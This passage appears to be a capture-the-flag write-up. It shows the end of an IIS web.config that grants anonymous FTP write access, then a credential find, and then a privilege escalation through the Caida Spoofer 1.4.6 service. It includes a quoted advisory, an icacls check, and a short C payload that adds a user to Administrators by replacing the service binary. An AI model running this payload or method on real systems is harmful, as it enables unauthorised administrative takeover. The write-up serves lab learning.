            <mimeMap fileExtension=".pmr" mimeType="application/x-perfmon" />
            <mimeMap fileExtension=".pmw" mimeType="application/x-perfmon" />
            <mimeMap fileExtension=".png" mimeType="image/png" />
            <mimeMap fileExtension=".pnm" mimeType="image/x-portable-anymap" />
            <mimeMap fileExtension=".pnz" mimeType="image/png" />
            <mimeMap fileExtension=".pot" mimeType="application/vnd.ms-powerpoint" />
            <mimeMap fileExtension=".potm" mimeType="application/vnd.ms-powerpoint.template.macroEnabled.12" />
            <mimeMap fileExtension=".potx" mimeType="application/vnd.openxmlformats-officedocument.presentationml.template" />
            <mimeMap fileExtension=".ppam" mimeType="application/vnd.ms-powerpoint.addin.macroEnabled.12" />
            <mimeMap fileExtension=".ppm" mimeType="image/x-portable-pixmap" />
            <mimeMap fileExtension=".pps" mimeType="application/vnd.ms-powerpoint" />
            <mimeMap fileExtension=".ppsm" mimeType="application/vnd.ms-powerpoint.slideshow.macroEnabled.12" />
            <mimeMap fileExtension=".ppsx" mimeType="application/vnd.openxmlformats-officedocument.presentationml.slideshow" />
            <mimeMap fileExtension=".ppt" mimeType="application/vnd.ms-powerpoint" />
            <mimeMap fileExtension=".pptm" mimeType="application/vnd.ms-powerpoint.presentation.macroEnabled.12" />
            <mimeMap fileExtension=".pptx" mimeType="application/vnd.openxmlformats-officedocument.presentationml.presentation" />
            <mimeMap fileExtension=".prf" mimeType="application/pics-rules" />
            <mimeMap fileExtension=".prm" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".prx" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".ps" mimeType="application/postscript" />
            <mimeMap fileExtension=".psd" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".psm" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".psp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".pub" mimeType="application/x-mspublisher" />
            <mimeMap fileExtension=".qt" mimeType="video/quicktime" />
            <mimeMap fileExtension=".qtl" mimeType="application/x-quicktimeplayer" />
            <mimeMap fileExtension=".qxd" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".ra" mimeType="audio/x-pn-realaudio" />
            <mimeMap fileExtension=".ram" mimeType="audio/x-pn-realaudio" />
            <mimeMap fileExtension=".rar" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".ras" mimeType="image/x-cmu-raster" />
            <mimeMap fileExtension=".rf" mimeType="image/vnd.rn-realflash" />
            <mimeMap fileExtension=".rgb" mimeType="image/x-rgb" />
            <mimeMap fileExtension=".rm" mimeType="application/vnd.rn-realmedia" />
            <mimeMap fileExtension=".rmi" mimeType="audio/mid" />
            <mimeMap fileExtension=".roff" mimeType="application/x-troff" />
            <mimeMap fileExtension=".rpm" mimeType="audio/x-pn-realaudio-plugin" />
            <mimeMap fileExtension=".rtf" mimeType="application/rtf" />
            <mimeMap fileExtension=".rtx" mimeType="text/richtext" />
            <mimeMap fileExtension=".scd" mimeType="application/x-msschedule" />
            <mimeMap fileExtension=".sct" mimeType="text/scriptlet" />
            <mimeMap fileExtension=".sea" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".setpay" mimeType="application/set-payment-initiation" />
            <mimeMap fileExtension=".setreg" mimeType="application/set-registration-initiation" />
            <mimeMap fileExtension=".sgml" mimeType="text/sgml" />
            <mimeMap fileExtension=".sh" mimeType="application/x-sh" />
            <mimeMap fileExtension=".shar" mimeType="application/x-shar" />
            <mimeMap fileExtension=".sit" mimeType="application/x-stuffit" />
            <mimeMap fileExtension=".sldm" mimeType="application/vnd.ms-powerpoint.slide.macroEnabled.12" />
            <mimeMap fileExtension=".sldx" mimeType="application/vnd.openxmlformats-officedocument.presentationml.slide" />
            <mimeMap fileExtension=".smd" mimeType="audio/x-smd" />
            <mimeMap fileExtension=".smi" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".smx" mimeType="audio/x-smd" />
            <mimeMap fileExtension=".smz" mimeType="audio/x-smd" />
            <mimeMap fileExtension=".snd" mimeType="audio/basic" />
            <mimeMap fileExtension=".snp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".spc" mimeType="application/x-pkcs7-certificates" />
            <mimeMap fileExtension=".spl" mimeType="application/futuresplash" />
            <mimeMap fileExtension=".spx" mimeType="audio/ogg" />
            <mimeMap fileExtension=".src" mimeType="application/x-wais-source" />
            <mimeMap fileExtension=".ssm" mimeType="application/streamingmedia" />
            <mimeMap fileExtension=".sst" mimeType="application/vnd.ms-pki.certstore" />
            <mimeMap fileExtension=".stl" mimeType="application/vnd.ms-pki.stl" />
            <mimeMap fileExtension=".sv4cpio" mimeType="application/x-sv4cpio" />
            <mimeMap fileExtension=".sv4crc" mimeType="application/x-sv4crc" />
            <mimeMap fileExtension=".svg" mimeType="image/svg+xml" />
            <mimeMap fileExtension=".svgz" mimeType="image/svg+xml" />
            <mimeMap fileExtension=".swf" mimeType="application/x-shockwave-flash" />
            <mimeMap fileExtension=".t" mimeType="application/x-troff" />
            <mimeMap fileExtension=".tar" mimeType="application/x-tar" />
            <mimeMap fileExtension=".tcl" mimeType="application/x-tcl" />
            <mimeMap fileExtension=".tex" mimeType="application/x-tex" />
            <mimeMap fileExtension=".texi" mimeType="application/x-texinfo" />
            <mimeMap fileExtension=".texinfo" mimeType="application/x-texinfo" />
            <mimeMap fileExtension=".tgz" mimeType="application/x-compressed" />
            <mimeMap fileExtension=".thmx" mimeType="application/vnd.ms-officetheme" />
            <mimeMap fileExtension=".thn" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".tif" mimeType="image/tiff" />
            <mimeMap fileExtension=".tiff" mimeType="image/tiff" />
            <mimeMap fileExtension=".toc" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".tr" mimeType="application/x-troff" />
            <mimeMap fileExtension=".trm" mimeType="application/x-msterminal" />
            <mimeMap fileExtension=".ts" mimeType="video/vnd.dlna.mpeg-tts" />
            <mimeMap fileExtension=".tsv" mimeType="text/tab-separated-values" />
            <mimeMap fileExtension=".ttf" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".tts" mimeType="video/vnd.dlna.mpeg-tts" />
            <mimeMap fileExtension=".txt" mimeType="text/plain" />
            <mimeMap fileExtension=".u32" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".uls" mimeType="text/iuls" />
            <mimeMap fileExtension=".ustar" mimeType="application/x-ustar" />
            <mimeMap fileExtension=".vbs" mimeType="text/vbscript" />
            <mimeMap fileExtension=".vcf" mimeType="text/x-vcard" />
            <mimeMap fileExtension=".vcs" mimeType="text/plain" />
            <mimeMap fileExtension=".vdx" mimeType="application/vnd.ms-visio.viewer" />
            <mimeMap fileExtension=".vml" mimeType="text/xml" />
            <mimeMap fileExtension=".vsd" mimeType="application/vnd.visio" />
            <mimeMap fileExtension=".vss" mimeType="application/vnd.visio" />
            <mimeMap fileExtension=".vst" mimeType="application/vnd.visio" />
            <mimeMap fileExtension=".vsto" mimeType="application/x-ms-vsto" />
            <mimeMap fileExtension=".vsw" mimeType="application/vnd.visio" />
            <mimeMap fileExtension=".vsx" mimeType="application/vnd.visio" />
            <mimeMap fileExtension=".vtx" mimeType="application/vnd.visio" />
            <mimeMap fileExtension=".wasm" mimeType="application/wasm" />
            <mimeMap fileExtension=".wav" mimeType="audio/wav" />
            <mimeMap fileExtension=".wax" mimeType="audio/x-ms-wax" />
            <mimeMap fileExtension=".wbmp" mimeType="image/vnd.wap.wbmp" />
            <mimeMap fileExtension=".wcm" mimeType="application/vnd.ms-works" />
            <mimeMap fileExtension=".wdb" mimeType="application/vnd.ms-works" />
            <mimeMap fileExtension=".webm" mimeType="video/webm" />
            <mimeMap fileExtension=".wks" mimeType="application/vnd.ms-works" />
            <mimeMap fileExtension=".wm" mimeType="video/x-ms-wm" />
            <mimeMap fileExtension=".wma" mimeType="audio/x-ms-wma" />
            <mimeMap fileExtension=".wmd" mimeType="application/x-ms-wmd" />
            <mimeMap fileExtension=".wmf" mimeType="application/x-msmetafile" />
            <mimeMap fileExtension=".wml" mimeType="text/vnd.wap.wml" />
            <mimeMap fileExtension=".wmlc" mimeType="application/vnd.wap.wmlc" />
            <mimeMap fileExtension=".wmls" mimeType="text/vnd.wap.wmlscript" />
            <mimeMap fileExtension=".wmlsc" mimeType="application/vnd.wap.wmlscriptc" />
            <mimeMap fileExtension=".wmp" mimeType="video/x-ms-wmp" />
            <mimeMap fileExtension=".wmv" mimeType="video/x-ms-wmv" />
            <mimeMap fileExtension=".wmx" mimeType="video/x-ms-wmx" />
            <mimeMap fileExtension=".wmz" mimeType="application/x-ms-wmz" />
            <mimeMap fileExtension=".woff" mimeType="font/x-woff" />
            <mimeMap fileExtension=".woff2" mimeType="application/font-woff2" />
            <mimeMap fileExtension=".wps" mimeType="application/vnd.ms-works" />
            <mimeMap fileExtension=".wri" mimeType="application/x-mswrite" />
            <mimeMap fileExtension=".wrl" mimeType="x-world/x-vrml" />
            <mimeMap fileExtension=".wrz" mimeType="x-world/x-vrml" />
            <mimeMap fileExtension=".wsdl" mimeType="text/xml" />
            <mimeMap fileExtension=".wtv" mimeType="video/x-ms-wtv" />
            <mimeMap fileExtension=".wvx" mimeType="video/x-ms-wvx" />
            <mimeMap fileExtension=".x" mimeType="application/directx" />
            <mimeMap fileExtension=".xaf" mimeType="x-world/x-vrml" />
            <mimeMap fileExtension=".xaml" mimeType="application/xaml+xml" />
            <mimeMap fileExtension=".xap" mimeType="application/x-silverlight-app" />
            <mimeMap fileExtension=".xbap" mimeType="application/x-ms-xbap" />
            <mimeMap fileExtension=".xbm" mimeType="image/x-xbitmap" />
            <mimeMap fileExtension=".xdr" mimeType="text/plain" />
            <mimeMap fileExtension=".xht" mimeType="application/xhtml+xml" />
            <mimeMap fileExtension=".xhtml" mimeType="application/xhtml+xml" />
            <mimeMap fileExtension=".xla" mimeType="application/vnd.ms-excel" />
            <mimeMap fileExtension=".xlam" mimeType="application/vnd.ms-excel.addin.macroEnabled.12" />
            <mimeMap fileExtension=".xlc" mimeType="application/vnd.ms-excel" />
            <mimeMap fileExtension=".xlm" mimeType="application/vnd.ms-excel" />
            <mimeMap fileExtension=".xls" mimeType="application/vnd.ms-excel" />
            <mimeMap fileExtension=".xlsb" mimeType="application/vnd.ms-excel.sheet.binary.macroEnabled.12" />
            <mimeMap fileExtension=".xlsm" mimeType="application/vnd.ms-excel.sheet.macroEnabled.12" />
            <mimeMap fileExtension=".xlsx" mimeType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" />
            <mimeMap fileExtension=".xlt" mimeType="application/vnd.ms-excel" />
            <mimeMap fileExtension=".xltm" mimeType="application/vnd.ms-excel.template.macroEnabled.12" />
            <mimeMap fileExtension=".xltx" mimeType="application/vnd.openxmlformats-officedocument.spreadsheetml.template" />
            <mimeMap fileExtension=".xlw" mimeType="application/vnd.ms-excel" />
            <mimeMap fileExtension=".xml" mimeType="text/xml" />
            <mimeMap fileExtension=".xof" mimeType="x-world/x-vrml" />
            <mimeMap fileExtension=".xpm" mimeType="image/x-xpixmap" />
            <mimeMap fileExtension=".xps" mimeType="application/vnd.ms-xpsdocument" />
            <mimeMap fileExtension=".xsd" mimeType="text/xml" />
            <mimeMap fileExtension=".xsf" mimeType="text/xml" />
            <mimeMap fileExtension=".xsl" mimeType="text/xml" />
            <mimeMap fileExtension=".xslt" mimeType="text/xml" />
            <mimeMap fileExtension=".xsn" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".xtp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".xwd" mimeType="image/x-xwindowdump" />
            <mimeMap fileExtension=".z" mimeType="application/x-compress" />
            <mimeMap fileExtension=".zip" mimeType="application/x-zip-compressed" />
        </staticContent>

        <tracing>

            <traceFailedRequests />

            <traceProviderDefinitions />

        </tracing>

        <urlCompression />

        <validation />

    </system.webServer>
    <system.ftpServer>
        <providerDefinitions>
            <add name="IisManagerAuth" type="Microsoft.Web.FtpServer.Security.IisManagerAuthenticationProvider,Microsoft.Web.FtpServer,version=7.5.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" />
            <add name="AspNetAuth" type="Microsoft.Web.FtpServer.Security.AspNetFtpMembershipProvider,Microsoft.Web.FtpServer,version=7.5.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" />
        </providerDefinitions>
        <log>
        </log>
        <firewallSupport />
        <caching>
        </caching>
        <security>
            <ipSecurity />
            <requestFiltering>
                <hiddenSegments>
                    <add segment="_vti_bin" />
                </hiddenSegments>
            </requestFiltering>
            <authorization>
                <add accessType="Allow" users="?" permissions="Read" />
                <add accessType="Allow" users="*" permissions="Read" />
            </authorization>
        </security>
    </system.ftpServer>
    <location path="data-leaks">
        <system.ftpServer>
            <security>
                <authorization>
                    <add accessType="Allow" users="*" permissions="Read, Write" />
                    <add accessType="Allow" users="?" permissions="Read, Write" />
                </authorization>
            </security>
        </system.ftpServer>
    </location>

</configuration>

file >


Now, we have confirmed the path of the web server pah so let us check the `web.config` file

Inetpub is the folder on a computer that is the default folder for Microsoft Internet Information Services (IIS).
The **\inetpub\wwwroot** subfolder of the inetpub folder 
contains all the web pages and content that will be published on the 
web. It is the default directory for publishing web pages.



![Screenshot 2024-05-03 151153](https://github.com/user-attachments/assets/a39d1988-5a86-4c31-9a37-b0b217777e1c)

We find a set of credentials, withe Username and Password. Now we can SSH using the credentials:
![Screenshot 2024-05-03 151756](https://github.com/user-attachments/assets/35f4b9ac-5129-42b5-851c-8857f7eb7085)


The next tasks involves Privelege Escalation to be able to determine which organizations is the Hack Smarter group targeting next.

winPEAS or **PrivescCheck can be used. The aim is to** identify **Local Privilege Escalation** (LPE) 
vulnerabilities that are usually due to Windows configuration issues, or
 bad practices. It can also gather useful information for some 
exploitation and post-exploitation tasks.

Alternatively, 
Looking for installed programs, we notice `Spoofer` at `C:\Program Files (x86)\Spoofer`.

Checking the  CHANGES.txt we observe the `Spoofer` version.

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>type  CHANGES.txt
spoofer-1.4.6 (2020-07-24)



Searching for vulnerabilities in `Caida Spoofer 1.4.6`, we can use  [this](https://packetstormsecurity.com/files/166553/Spoofer-1.4.6-Privilege-Escalation-Unquoted-Service-Path.html).

We see , `Caida Spoofer 1.4.6` creates a service named `spoofer-scheduler` with an unquoted binary path.

Checking the service, we see that this is indeed the case, and it runs as `LocalSystem`.


BRIEF DESCRIPTION AND SYNOPSIS:

```

Description:

-------------

Caida Spoofer 1.4.6 installs a service (spoofer-scheduler) with an unquoted
service path. Since this service is running as SYSTEM, this creates a local
privilege escalation vulnerability. To properly exploit this vulnerability,
a local attacker can insert an executable in the path of the service.
Rebooting the system or restarting the service will run the malicious
executable with elevated privileges.

------------------

Proof of Concept:

------------------

C:\Users\asim.sattar>wmic service get name,pathname,displayname,startmode |
findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

Spoofer Scheduler   spoofer-scheduler   C:\Program Files
(x86)\Spoofer\spoofer-scheduler.exe  Auto

C:\Users\asim.sattar>sc qc "spoofer-scheduler"

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: spoofer-scheduler

        TYPE               : 10  WIN32_OWN_PROCESS

        START_TYPE         : 2   AUTO_START

        ERROR_CONTROL      : 1   NORMAL

        BINARY_PATH_NAME   : C:\Program Files
(x86)\Spoofer\spoofer-scheduler.exe

        LOAD_ORDER_GROUP   :

        TAG                : 0

        DISPLAY_NAME       : Spoofer Scheduler

        DEPENDENCIES       : tcpip

        SERVICE_START_NAME : LocalSystem

```

LAB CONTINUATION:

![Screenshot 2024-05-03 163152.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9b7390d5-4d19-4471-b29f-84cab3b1e0f9/37463022-bab7-4506-a591-cd54d17cd331/Screenshot_2024-05-03_163152.png)

*N.B:* 

. The **qc** command displays the following information about
 a service: SERVICE_NAME (service's registry subkey name), TYPE, 
ERROR_CONTROL, BINARY_PATH_NAME, LOAD_ORDER_GROUP, TAG, DISPLAY_NAME, 
DEPENDENCIES, and SERVICE_START_NAME.

. Administrators can use **Sc** commands to determine the 
binary name of any service and find out whether it shares a process with
other services. They do this by typing the following at the command 
prompt (where *ServiceName* is an actual service name):

 sc qc ServiceName


Unfortunately, we can’t create C:\Program.exe or C:\Program Files.exe to abuse the unquoted path. But instead, we have full privileges over the service binary.



tyler@HACKSMARTERSEC C:\Users\tyler>icacls "C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe"
C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe BUILTIN\Users:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

#Icacls is a Windows command-line utility that IT admins can use to change access control lists on files and folders. One of the most common tasks that an IT Pro or system administrator performs is modifying permission on a file server.


create an executable that will add the `tyler` user to the `Administrators` local group.

Writing a very simple C code does this:
#include <stdlib.h>

int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}



 Compiling it into an executable for Windows then We can  replace the service binary with our payload, and start it again:



 ![Screenshot 2024-05-03 172513](https://github.com/user-attachments/assets/22207309-cdd7-46dd-bf1b-7f62d2f541e2)



 We can re-login to the server and notice we have been added to the admin group:

 ![Screenshot 2024-05-03 173438](https://github.com/user-attachments/assets/b5f2be10-28fa-4364-9533-b47522836b17)


we can read the hacking-targets.txt file under the C:\Users\Administrator\Desktop\Hacking-Target:



![Screenshot 2024-05-03 173611](https://github.com/user-attachments/assets/421eb6b6-5389-45ac-882a-ba9c7a0199ef)

